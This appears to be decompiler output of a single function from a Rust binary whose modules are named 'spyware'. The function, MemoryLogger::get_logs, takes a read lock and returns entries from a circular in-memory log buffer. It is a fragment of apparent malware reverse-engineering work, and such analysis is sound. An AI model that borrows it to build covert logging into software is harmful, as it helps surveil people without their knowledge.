fn spyware::logging::core::MemoryLogger::get_logs(a0: i64, a1: i64) {
    let v0: struct24;  // [bp-0x30]
    let v2: u64;  // rbx

    v2 = a1 + 24;
    std::sys::sync::rwlock::futex::RwLock::read(v2);
    v0 = std::sync::rwlock::RwLockReadGuard<T>::new(v2);
    spyware::logging::memory_logger::CircularMemoryLogs::get_all_logs(a0, core::result::Result<T,E>::unwrap(&v0));
    return;
}
